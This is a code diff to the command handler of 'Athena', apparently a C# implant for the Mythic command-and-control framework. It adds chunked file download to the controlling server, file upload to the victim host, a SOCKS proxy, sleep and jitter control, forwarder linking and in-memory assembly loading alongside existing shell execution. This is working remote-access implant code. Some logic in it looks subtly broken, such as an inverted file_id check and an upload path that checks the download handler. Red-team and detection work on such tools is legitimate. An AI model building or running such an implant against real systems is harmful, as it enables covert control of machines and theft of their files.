@@ -6,6 +6,8 @@ using System.Linq;
 using System.Threading.Tasks;
 using System.Collections.Concurrent;
 using System.Text;
+using Athena.Utilities;
+using Newtonsoft.Json;
 
 namespace Athena.Commands
 {
@@ -13,14 +15,17 @@ namespace Athena.Commands
     {
         private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
         private AssemblyHandler assemblyHandler { get; set; }
+        private UploadHandler uploadHandler { get; set; }
+        private DownloadHandler downloadHandler { get; set; }
         private ConcurrentBag<object> responseResults { get; set; }
         public CommandHandler()
         {
             this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
             this.assemblyHandler = new AssemblyHandler();
+            this.downloadHandler = new DownloadHandler();
+            this.uploadHandler = new UploadHandler();
             this.responseResults = new ConcurrentBag<object>();
         }
-
         public async Task StartJob(MythicTask task)
         {
             MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
@@ -30,9 +35,13 @@ namespace Athena.Commands
             switch (job.task.command)
             {
                 case "download": //Can likely be dynamically loaded
+                    if (!await downloadHandler.ContainsJob(job.task.id))
+                    {
+                        this.responseResults.Add(await downloadHandler.StartDownloadJob(job));
+                    }
                     break;
                 case "execute-assembly":
-                    this.responseResults.Add(assemblyHandler.ExecuteAssembly(job));
+                    this.responseResults.Add(await assemblyHandler.ExecuteAssembly(job));
                     break;
                 case "exit":
                     Environment.Exit(0);
@@ -41,43 +50,68 @@ namespace Athena.Commands
                     this.responseResults.Add(await this.GetJobs(task.id));
                     break;
                 case "jobkill": //Maybe can be loaded? //Also add a kill command for processes
+                    this.responseResults.Add(new ResponseResult
+                    {
+                        user_output = "Not implemented yet.",
+                        completed = "true",
+                        task_id = job.task.id,
+                    });
                     break;
                 case "link":
+                    this.responseResults.Add(await Globals.mc.MythicConfig.forwarder.Link(job));
                     break;
                 case "load":
                     this.responseResults.Add(await assemblyHandler.LoadCommandAsync(job));
                     break;
                 case "load-assembly":
+                    this.responseResults.Add(await assemblyHandler.LoadAssemblyAsync(job));
                     break;
                 case "reset-assembly-context":
+                    this.responseResults.Add(await assemblyHandler.ClearAssemblyLoadContext(job));
                     break;
                 case "shell": //Can be dynamically loaded
                     this.responseResults.Add(await Execution.ShellExec(job));
                     break;
                 case "sleep":
+                    this.responseResults.Add(await this.SetSleep(job));
                     break;
                 case "socks": //Maybe can be dynamically loaded? Might be better to keep it built-in
+                    if(await Globals.socksHandler.Start())
+                    {
+                        this.responseResults.Add(new ResponseResult
+                        {
+                            user_output = "Socks Started",
+                            completed = "true",
+                            task_id = job.task.id,
+                        });
+                    }
                     break;
                 case "stop-assembly":
+                    this.responseResults.Add(new ResponseResult
+                    {
+                        user_output = "Not implemented yet.",
+                        completed = "true",
+                        task_id = job.task.id,
+                    });
                     break;
                 case "unlink":
                     break;
                 case "upload": //Can likely be dynamically loaded
-                    break;
-                case "stop":
+                    if(!await downloadHandler.ContainsJob(job.task.id))
+                    {
+                        this.responseResults.Add(await uploadHandler.StartUploadJob(job));
+                    }
                     break;
                 default:
-                    this.responseResults.Add(await checkAndRunPlugin(job));
+                    this.responseResults.Add(await CheckAndRunPlugin(job));
                     break;
             }
             this.activeJobs.Remove(task.id, out _);
         }
-
         public async Task StopJob(MythicTask task)
         {
             //todo
         }
-
         public async Task<List<object>> GetResponses()
         {
             List<object> responses = this.responseResults.ToList<object>();
@@ -95,7 +129,7 @@ namespace Athena.Commands
                 this.responseResults.Prepend<object>(response); //Add to the beginning in case another task result returns
             }
         }
-        private async Task<object> GetJobs(string task_id)
+        private async Task<ResponseResult> GetJobs(string task_id)
         {
             StringBuilder sb = new StringBuilder();
             foreach (var j in this.activeJobs)
@@ -119,12 +153,12 @@ namespace Athena.Commands
                 completed = "true"
             };
         }
-
+        
         /// <summary>
         /// Determine if a Mythic command is loaded, if it is, run it
         /// </summary>
         /// <param name="job">MythicJob containing execution parameters</param>
-        private async Task<object> checkAndRunPlugin(MythicJob job)
+        private async Task<object> CheckAndRunPlugin(MythicJob job)
         {
             if (await this.assemblyHandler.CommandIsLoaded(job.task.command))
             {
@@ -141,5 +175,173 @@ namespace Athena.Commands
                 };
             }
         }
+        public async Task HandleUploadPiece(MythicResponseResult response)
+        {
+            MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
+
+            if (uploadJob.complete)
+            {
+                await this.uploadHandler.CompleteUploadJob(response.task_id);
+            }
+
+
+            if(uploadJob.total_chunks == 0)
+            {
+                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
+            }
+            if (!String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
+            {
+                await this.uploadHandler.UploadNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
+                
+                if (response.chunk_num == uploadJob.total_chunks-1)
+                {
+                    this.responseResults.Add(new UploadResponse
+                    {
+                        task_id=response.task_id,
+                        completed = "true",
+                        upload = new UploadResponseData
+                        {
+                            chunk_num = uploadJob.chunk_num,
+                            file_id = response.file_id,
+                            chunk_size = uploadJob.chunk_size,
+                            full_path = uploadJob.path
+                        }
+                    });
+
+                    await this.uploadHandler.CompleteUploadJob(response.task_id);
+                    this.activeJobs.Remove(response.task_id, out _);
+                }
+                else
+                {
+                    this.responseResults.Add(new UploadResponse
+                    {
+                        task_id = response.task_id,
+                        upload = new UploadResponseData
+                        {
+                            chunk_num = uploadJob.chunk_num,
+                            file_id = response.file_id,
+                            chunk_size = uploadJob.chunk_size,
+                            full_path = uploadJob.path
+                        }
+                    });
+
+                    uploadJob.chunk_num++;
+                    Console.WriteLine(uploadJob.chunk_num);
+                }
+                
+            }
+        }
+        public async Task HandleDownloadPiece(MythicResponseResult response)
+        {
+            MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);
+
+            if (String.IsNullOrEmpty(response.file_id))
+            {
+                this.responseResults.Add(new DownloadResponse
+                {
+                    task_id = response.task_id,
+                    status = "error",
+                    user_output = "No file_id received from Mythic",
+                    completed = "true"
+                });
+            }
+            else
+            {
+                if (String.IsNullOrEmpty(response.file_id))
+                {
+                    downloadJob.file_id = response.file_id;
+                }
+
+                if (response.status == "success")
+                {
+                    if (downloadJob.chunk_num != downloadJob.total_chunks)
+                    {
+                        downloadJob.chunk_num++;
+
+                        this.responseResults.Add(new DownloadResponse
+                        {
+                            task_id = response.task_id,
+                            user_output = "",
+                            status = "",
+                            full_path = "",
+                            total_chunks = -1,
+                            file_id = downloadJob.file_id,
+                            chunk_num = downloadJob.chunk_num,
+                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
+                        });
+                    }
+                    else
+                    {
+                        await this.downloadHandler.CompleteDownloadJob(response.task_id);
+                        this.activeJobs.Remove(response.task_id, out _);
+                        this.responseResults.Add(new DownloadResponse
+                        {
+                            task_id = response.task_id,
+                            user_output = "",
+                            status = "",
+                            full_path = "",
+                            chunk_num = downloadJob.chunk_num,
+                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob),
+                            file_id = downloadJob.file_id,
+                            completed = "true",
+                            total_chunks = -1
+                            
+                        });
+                    }
+                }
+                else
+                {
+                    this.responseResults.Add(new DownloadResponse
+                    {
+                        task_id = response.task_id,
+                        file_id = downloadJob.file_id,
+                        chunk_num = downloadJob.chunk_num,
+                        chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
+                    });
+                }
+            }
+        }   
+        public async Task<bool> HasUploadJob(string task_id)
+        {
+            return await this.uploadHandler.ContainsJob(task_id);
+        }
+        public async Task<bool> HasDownloadJob(string task_id)
+        {
+            return await this.downloadHandler.ContainsJob(task_id);
+        }
+        private async Task<ResponseResult> SetSleep(MythicJob job)
+        {
+            StringBuilder sb = new StringBuilder();
+            var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+            if (sleepInfo.ContainsKey("sleep"))
+            {
+                try
+                {
+                    Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["sleep"].ToString());
+                }
+                catch (Exception e)
+                {
+                    sb.AppendLine("Invalid sleeptime specified.");
+                }
+            }
+            if (sleepInfo.ContainsKey("jitter"))
+            {
+                try
+                {
+                    Globals.mc.MythicConfig.jitter = int.Parse(sleepInfo["jitter"].ToString());
+                }
+                catch (Exception e)
+                {
+                    sb.AppendLine("Invalid jitter specified.");
+                }
+            }
+
+            return new ResponseResult
+            {
+                user_output = sb.ToString(),
+                completed = "true",
+                task_id = job.task.id,
+            };
+        }    
     }
 }
